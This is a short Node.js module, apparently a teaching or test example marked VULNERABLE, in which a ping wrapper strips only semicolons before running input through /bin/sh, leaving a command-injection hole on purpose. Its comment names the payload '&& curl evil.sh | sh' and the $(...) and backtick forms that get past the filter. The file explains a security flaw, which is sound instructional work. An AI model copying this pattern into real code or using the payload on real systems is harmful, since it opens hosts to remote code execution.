/**
 * VULNERABLE - partial mitigation. The "sanitiser" strips `;` only, so
 * `&& curl evil.sh | sh`, `$(...)` and backticks all survive it. Stripping one
 * metacharacter does not make a command line safe.
 */
const { spawn } = require('child_process');

function sanitize(input) {
  return String(input).replace(/;/g, '');
}

module.exports = function ping(host) {
  const safeHost = sanitize(host);
  return spawn('/bin/sh', ['-c', `ping -c 1 ${safeHost}`], { timeout: 5000 });
};
